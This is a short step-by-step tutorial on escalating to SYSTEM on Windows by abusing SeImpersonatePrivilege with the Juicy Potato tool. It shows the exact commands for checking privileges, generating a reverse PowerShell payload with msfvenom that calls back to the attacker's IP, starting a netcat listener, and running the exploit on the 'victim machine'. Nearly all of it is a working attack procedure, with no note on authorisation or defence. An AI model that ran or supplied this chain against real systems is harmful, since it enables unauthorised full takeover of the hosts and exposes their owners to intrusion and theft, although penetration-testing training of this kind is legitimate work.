
# 🥔 Juicy Potato — Privilege Escalation via SeImpersonatePrivilege

### 🔍 What is Juicy Potato?

**Juicy Potato** is a Windows local privilege escalation tool that abuses the **SeImpersonatePrivilege** to gain **SYSTEM-level access** from a low-privileged user account.

### ✅ Requirements

- You already have **a shell** (or Meterpreter session) on the **target machine**
- The user must have the `SeImpersonatePrivilege` **enabled**

### 🧪 Step-by-Step Guide

### 1️⃣ Check User Privileges

On the target machine, run:

```bash
whoami /priv
```

Look for this line:

```
SeImpersonatePrivilege      Enabled
```

> ✅ If it's enabled, you can continue with the Juicy Potato attack!
> 

### 2️⃣ Download Juicy Potato

Download the executable from:

👉 https://github.com/ohpe/juicy-potato

Rename it (for simplicity):

```bash
jp.exe
```

Copy it to the **victim machine**.

### 3️⃣ Create a Malicious Payload

On your **attacker machine** (Kali), generate a reverse shell in `.bat` format:

```bash
msfvenom -p cmd/windows/reverse_powershell LHOST=<Your_IP> LPORT=<Your_Port> -f raw > myshell.bat
```

Replace `<Your_IP>` and `<Your_Port>` with your Kali IP and chosen port.

Upload `myshell.bat` to the **victim machine**.

### 4️⃣ Start Netcat Listener

On your Kali machine:

```bash
nc -nlvp <Your_Port>
```

### 5️⃣ Run Juicy Potato Exploit

On the victim machine:

```bash
jp.exe -t * -p myshell.bat -l 4444
```

- `t *` = Try all available COM types
- `p myshell.bat` = The payload you want to run
- `l 4444` = Port used by the fake COM server (can be any unused port)

### 🎉 Result

You should now get a **reverse shell as SYSTEM** on your Netcat listener!
